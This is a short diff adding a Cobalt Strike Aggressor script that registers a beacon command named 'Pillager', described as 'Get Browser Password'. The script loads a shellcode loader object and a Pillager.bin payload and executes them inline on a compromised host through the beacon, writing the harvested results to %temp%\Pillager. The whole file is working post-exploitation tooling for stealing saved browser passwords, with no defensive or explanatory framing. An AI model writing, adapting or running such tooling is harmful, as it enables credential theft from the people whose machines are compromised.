@@ -1,0 +1,23 @@
+beacon_command_register(
+"Pillager", 
+"Get Browser Password", 
+"Usage: Pillager");
+
+alias Pillager {
+    $bid = $1;
+	$barch  = barch($bid);
+
+    $handle1 = openf(script_resource("module/scloader. $+ $barch $+ .o"));
+    $data1   = readb($handle1, -1);
+    closef($handle1);
+
+    $handle2 = openf(script_resource("module/Pillager.bin"));
+    $data2   = readb($handle2, -1);
+    closef($handle2);
+
+
+    $args   = bof_pack($bid, "b", $data2);
+    beacon_inline_execute($bid, $data1, "go", $args);
+    btask($bid, "Results can be found at %temp%\\Pillager");
+
+}
